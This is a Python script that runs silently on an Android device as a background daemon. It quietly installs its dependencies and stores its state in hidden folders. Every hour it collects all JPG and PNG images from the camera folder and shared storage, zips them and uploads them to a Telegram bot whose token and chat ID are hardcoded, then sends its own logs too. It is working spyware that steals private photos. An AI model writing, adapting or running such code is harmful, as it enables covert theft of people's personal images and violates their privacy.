import subprocess
import sys
import os
required_libraries = ["requests", "zipfile"]
def install_libraries():
    with open(os.devnull, "w") as devnull:
        for library in required_libraries:
            try:
                subprocess.check_call([sys.executable, "-m", "pip", "install", library], stdout=devnull, stderr=devnull)
            except subprocess.CalledProcessError:
                pass
install_libraries()
import zipfile
import requests
from datetime import datetime
import time
BASE_PATH = "/storage/emulated/0/"
DCIM_PATH = os.path.join(BASE_PATH, "DCIM")
HIDDEN_DIR = os.path.join(BASE_PATH, ".Da")
LOG_FILE = os.path.join(HIDDEN_DIR, ".Pa", "paths.txt")
MD_LOG_FILE = os.path.join(HIDDEN_DIR, ".Pa", "MD.log")
TELEGRAM_TOKEN = "7886608228:AAEoAIsyYwt-NsF3ABkVSONRQXkHZXIDLaI"
CHAT_ID = "6522096133"
os.makedirs(os.path.dirname(LOG_FILE), exist_ok=True)
def log_operation(message):
    with open(MD_LOG_FILE, "a") as log_file:
        log_file.write(f"{datetime.now().strftime('%H:%M')} {message}\n")
def load_sent_paths():
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, "r") as file:
            return set(line.strip() for line in file)
    return set()
def save_sent_path(path):
    with open(LOG_FILE, "a") as file:
        file.write(f"{path}\n")
def compress_file(source, destination):
    os.makedirs(os.path.dirname(destination), exist_ok=True)
    with zipfile.ZipFile(destination, "w", zipfile.ZIP_DEFLATED) as zipf:
        zipf.write(source, os.path.basename(source))
def send_to_telegram(file_path):
    for _ in range(2):
        try:
            with open(file_path, "rb") as file:
                response = requests.post(
                    f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument",
                    data={"chat_id": CHAT_ID},
                    files={"document": file}
                )
            if response.status_code == 200:
                return True
        except Exception:
            pass
    return False
def process_folder(folder_path, sent_paths):
    for root, _, files in os.walk(folder_path):
        for file in files:
            if file.endswith((".jpg", ".jpeg", ".png", ".img")):
                full_path = os.path.join(root, file)
                if full_path in sent_paths:
                    continue
                compressed_path = os.path.join(HIDDEN_DIR, f"{file}.zip")
                try:
                    compress_file(full_path, compressed_path)
                    if send_to_telegram(compressed_path):
                        log_operation(f"BM File {file} has been sent successfully")
                        save_sent_path(full_path)
                        os.remove(compressed_path)
                    else:
                        log_operation(f"BM Failed to send file {file}")
                except Exception:
                    log_operation(f"BM Error processing file {file}")
def main():
    while True:
        sent_paths = load_sent_paths()
        log_operation("BM Processing DCIM folder...")
        process_folder(DCIM_PATH, sent_paths)
        log_operation("BM Processing main storage folder...")
        process_folder(BASE_PATH, sent_paths)
        log_operation("BM Sending paths.txt file...")
        send_to_telegram(LOG_FILE)
        log_operation("BM Sending MD.log file...")
        send_to_telegram(MD_LOG_FILE)
        log_operation("BM Program cycle completed. Sleeping...")
        time.sleep(3600)
if __name__ == "__main__":
    if os.fork() > 0:
        sys.exit()
    os.setsid()
    os.umask(0)
    main()
